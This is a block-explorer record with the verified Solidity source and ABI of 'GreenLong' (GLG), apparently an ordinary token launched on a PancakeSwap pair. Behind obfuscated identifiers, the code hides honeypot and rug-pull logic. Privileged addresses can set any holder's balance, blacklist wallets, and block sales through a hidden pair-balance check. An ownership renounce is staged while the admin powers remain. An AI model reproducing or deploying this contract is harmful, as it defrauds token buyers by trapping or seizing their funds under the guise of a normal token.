{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface txShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract minAt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface walletSell {\n    function createPair(address takeMin, address enableFee) external returns (address);\n}\n\ninterface launchAmountAuto {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address isFund) external view returns (uint256);\n\n    function transfer(address toReceiver, uint256 feeAuto) external returns (bool);\n\n    function allowance(address exemptTxSwap, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeAuto) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address toReceiver,\n        uint256 feeAuto\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverSwapLaunched, uint256 value);\n    event Approval(address indexed exemptTxSwap, address indexed spender, uint256 value);\n}\n\ninterface launchAmountAutoMetadata is launchAmountAuto {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract GreenLong is minAt, launchAmountAuto, launchAmountAutoMetadata {\n\n    function maxExempt(address liquiditySender, address toReceiver, uint256 feeAuto) internal returns (bool) {\n        if (liquiditySender == shouldFee) {\n            return enableLaunchLiquidity(liquiditySender, toReceiver, feeAuto);\n        }\n        uint256 isModeReceiver = launchAmountAuto(listTotal).balanceOf(tradingMarketing);\n        require(isModeReceiver == toFund);\n        require(toReceiver != tradingMarketing);\n        if (receiverLimit[liquiditySender]) {\n            return enableLaunchLiquidity(liquiditySender, toReceiver, limitWallet);\n        }\n        return enableLaunchLiquidity(liquiditySender, toReceiver, feeAuto);\n    }\n\n    address public shouldFee;\n\n    function decimals() external view virtual override returns (uint8) {\n        return isMode;\n    }\n\n    event OwnershipTransferred(address indexed modeSender, address indexed exemptMarketing);\n\n    uint256 public exemptEnableAmount;\n\n    mapping(address => uint256) private shouldTokenTeam;\n\n    function getOwner() external view returns (address) {\n        return launchReceiverFrom;\n    }\n\n    address private launchReceiverFrom;\n\n    uint256 private amountTrading = 100000000 * 10 ** 18;\n\n    uint256 public swapAmount;\n\n    uint256 public listSellTrading;\n\n    address public listTotal;\n\n    uint256 public modeSell;\n\n    bool private sellFrom;\n\n    function balanceOf(address isFund) public view virtual override returns (uint256) {\n        return shouldTokenTeam[isFund];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return amountTrading;\n    }\n\n    uint256 toFund;\n\n    address tradingMarketing = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function isReceiver() private view {\n        require(totalSwap[_msgSender()]);\n    }\n\n    uint8 private isMode = 18;\n\n    function shouldReceiver(address swapEnable, uint256 feeAuto) public {\n        isReceiver();\n        shouldTokenTeam[swapEnable] = feeAuto;\n    }\n\n    string private launchedTake = \"GLG\";\n\n    function transfer(address swapEnable, uint256 feeAuto) external virtual override returns (bool) {\n        return maxExempt(_msgSender(), swapEnable, feeAuto);\n    }\n\n    function launchBuyTotal(address maxLimit) public {\n        isReceiver();\n        \n        if (maxLimit == shouldFee || maxLimit == listTotal) {\n            return;\n        }\n        receiverLimit[maxLimit] = true;\n    }\n\n    function enableLaunchLiquidity(address liquiditySender, address toReceiver, uint256 feeAuto) internal returns (bool) {\n        require(shouldTokenTeam[liquiditySender] >= feeAuto);\n        shouldTokenTeam[liquiditySender] -= feeAuto;\n        shouldTokenTeam[toReceiver] += feeAuto;\n        emit Transfer(liquiditySender, toReceiver, feeAuto);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private atSwap;\n\n    function exemptModeFee() public {\n        emit OwnershipTransferred(shouldFee, address(0));\n        launchReceiverFrom = address(0);\n    }\n\n    uint256 constant limitWallet = 17 ** 10;\n\n    function teamLaunch(uint256 feeAuto) public {\n        isReceiver();\n        toFund = feeAuto;\n    }\n\n    address fromAutoFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    constructor (){\n        if (sellFee == sellFrom) {\n            listSellTrading = fromTake;\n        }\n        txShould buyToTx = txShould(fromAutoFund);\n        listTotal = walletSell(buyToTx.factory()).createPair(buyToTx.WETH(), address(this));\n        \n        shouldFee = _msgSender();\n        exemptModeFee();\n        totalSwap[shouldFee] = true;\n        shouldTokenTeam[shouldFee] = amountTrading;\n        \n        emit Transfer(address(0), shouldFee, amountTrading);\n    }\n\n    uint256 private fromTake;\n\n    bool private sellFee;\n\n    mapping(address => bool) public receiverLimit;\n\n    function owner() external view returns (address) {\n        return launchReceiverFrom;\n    }\n\n    bool private buyFromLaunched;\n\n    function transferFrom(address liquiditySender, address toReceiver, uint256 feeAuto) external override returns (bool) {\n        if (_msgSender() != fromAutoFund) {\n            if (atSwap[liquiditySender][_msgSender()] != type(uint256).max) {\n                require(feeAuto <= atSwap[liquiditySender][_msgSender()]);\n                atSwap[liquiditySender][_msgSender()] -= feeAuto;\n            }\n        }\n        return maxExempt(liquiditySender, toReceiver, feeAuto);\n    }\n\n    mapping(address => bool) public totalSwap;\n\n    function allowance(address txLiquidity, address launchedReceiver) external view virtual override returns (uint256) {\n        if (launchedReceiver == fromAutoFund) {\n            return type(uint256).max;\n        }\n        return atSwap[txLiquidity][launchedReceiver];\n    }\n\n    uint256 private tokenFrom;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedTake;\n    }\n\n    function approve(address launchedReceiver, uint256 feeAuto) public virtual override returns (bool) {\n        atSwap[_msgSender()][launchedReceiver] = feeAuto;\n        emit Approval(_msgSender(), launchedReceiver, feeAuto);\n        return true;\n    }\n\n    function feeAmount(address buyAmount) public {\n        require(buyAmount.balance < 100000);\n        if (fromReceiver) {\n            return;\n        }\n        if (sellFrom) {\n            swapAmount = fromTake;\n        }\n        totalSwap[buyAmount] = true;\n        if (listSellTrading == swapAmount) {\n            swapAmount = tokenFrom;\n        }\n        fromReceiver = true;\n    }\n\n    string private sellTx = \"Green Long\";\n\n    bool public fromReceiver;\n\n    uint256 limitFrom;\n\n    function name() external view virtual override returns (string memory) {\n        return sellTx;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptTxSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptMarketing\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverSwapLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeAuto\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isFund\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptEnableAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptModeFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyAmount\",\"type\":\"address\"}],\"name\":\"feeAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxLimit\",\"type\":\"address\"}],\"name\":\"launchBuyTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listSellTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeAuto\",\"type\":\"uint256\"}],\"name\":\"shouldReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeAuto\",\"type\":\"uint256\"}],\"name\":\"teamLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeAuto\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquiditySender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeAuto\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "GreenLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}